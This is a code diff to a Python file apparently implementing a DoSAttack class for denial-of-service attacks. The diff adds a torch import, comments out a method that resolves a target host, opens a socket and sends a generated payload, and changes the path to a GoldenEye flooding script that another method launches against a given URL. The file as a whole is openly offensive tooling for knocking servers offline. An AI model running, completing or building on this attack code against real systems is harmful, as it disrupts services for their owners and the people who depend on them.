@@ -5,6 +5,7 @@ import logging
 import subprocess
 from urllib.parse import urlparse
 import os
+import torch
 
 
 logging.basicConfig(
@@ -16,20 +17,20 @@ class DoSAttack:
     def __init__(self):
         self.threads = []
 
-    def create_connection(self, url, target_port, model=RandomStringGenerator(100)):
-        try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            parsed_url = urlparse(url)
-            hostname = parsed_url.netloc
-            ip = socket.gethostbyname(hostname)
-            sock.connect((ip, target_port))
-            payload = model(torch.tensor([])).encode()  # Generate payload
-            sock.send(payload)
-            logging.info(f"Payload sent: {payload}")
-            sock.send(b"QUIT")
-            sock.close()
-        except Exception as e:
-            logging.error(f"Exception occurred while creating a connection: {e}")
+    # def create_connection(self, url, target_port, model=RandomStringGenerator(100)):
+    #     try:
+    #         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    #         parsed_url = urlparse(url)
+    #         hostname = parsed_url.netloc
+    #         ip = socket.gethostbyname(hostname)
+    #         sock.connect((ip, target_port))
+    #         payload = model(torch.tensor([])).encode()  # Generate payload
+    #         sock.send(payload)
+    #         logging.info(f"Payload sent: {payload}")
+    #         sock.send(b"QUIT")
+    #         sock.close()
+    #     except Exception as e:
+    #         logging.error(f"Exception occurred while creating a connection: {e}")
 
     def send_line(self, s, line):
         line = f"{line}\r\n"
@@ -156,7 +157,7 @@ class DoSAttack:
         nosslcheck=True,
     ):
         logging.info("Attacking %s with GoldenEye...", url)
-        path = os.path.join(os.path.dirname(__file__), "goldeneye.py")
+        path = os.path.join(os.path.dirname(__file__), "DOS/goldeneye.py")
         command = [
             "python3",
             path,
